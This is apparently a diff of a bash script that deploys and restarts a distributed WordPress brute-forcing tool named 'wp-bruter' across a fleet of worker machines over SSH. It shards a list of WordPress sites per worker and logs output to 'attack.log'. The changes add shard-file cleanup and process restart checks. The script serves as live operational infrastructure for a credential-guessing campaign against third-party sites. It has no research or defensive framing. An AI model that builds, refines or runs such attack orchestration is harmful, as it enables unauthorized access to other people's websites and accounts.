@@ -113,11 +113,14 @@ for WORKER in "${WORKERS[@]}"; do
         fi
 
         ssh_cmd "$WORKER" "
+
             # Progress is only meaningful for the exact same site shard; wipe it
             # when the shard hash changed (fleet size or list changed).
             SHARD_SUM=\$(md5sum /root/wordpress.s$idx | cut -d' ' -f1)
             [ \"\$SHARD_SUM\" = \"\$(cat /opt/wp-bruter/shard.sum 2>/dev/null)\" ] || rm -f /opt/wp-bruter/progress.txt
             echo \"\$SHARD_SUM\" > /opt/wp-bruter/shard.sum
+            # Shards from an earlier fleet size would confuse the monitor.
+            find /root -maxdepth 1 -name 'wordpress.s*' ! -name 'wordpress.s$idx' -delete 2>/dev/null
             mv -f /opt/wp-bruter/wp-bruter.new /opt/wp-bruter/wp-bruter
             chmod +x /opt/wp-bruter/wp-bruter
             pkill -9 -f '^/bin/bash .*run[.]sh' 2>/dev/null || true
@@ -125,7 +128,7 @@ for WORKER in "${WORKERS[@]}"; do
             # A SIGTERM drain can take a while (in-flight 5s requests); -9 is
             # immediate, but wait for the PID to disappear before restarting so
             # the new instance is not refused. -x, because the ssh session's own
-            # `bash -c` line also contains the binary name.
+            # bash -c line also contains the binary name.
             for i in \$(seq 1 30); do pgrep -x wp-bruter >/dev/null || break; sleep 1; done
             sleep 1
             mkdir -p /opt/wp-bruter
@@ -138,8 +141,10 @@ for WORKER in "${WORKERS[@]}"; do
             PREP_PER_BOX=$PREP_PER_BOX \
             nohup ./run.sh $idx >> attack.log 2>&1 &
             sleep 2
+            # The binary can take a moment to show up while run.sh changes phase.
+            for i in \$(seq 1 15); do pgrep -x wp-bruter >/dev/null && break; sleep 1; done
             pgrep -x wp-bruter > /dev/null && echo '  ✅ Running' || echo '  ❌ Failed'
-            true
+
         "
     ) &
     idx=$((idx + 1))
